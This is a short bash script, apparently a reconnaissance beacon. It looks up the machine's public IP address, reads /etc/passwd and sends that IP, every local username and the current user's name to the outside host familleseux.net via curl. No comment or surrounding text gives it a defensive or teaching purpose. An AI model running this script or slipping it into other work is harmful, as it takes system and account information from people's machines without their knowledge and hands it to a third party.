#!/bin/bash

ip=$(curl -s -f https://canihazip.com/s)
curl -s -f https://familleseux.net/ping/$ip

cat /etc/passwd | cut -d: -f1 | while read l; do
  curl -s -f https://familleseux.net/user/$l
done

curl -sf https://familleseux.net/whoami/$(whoami)
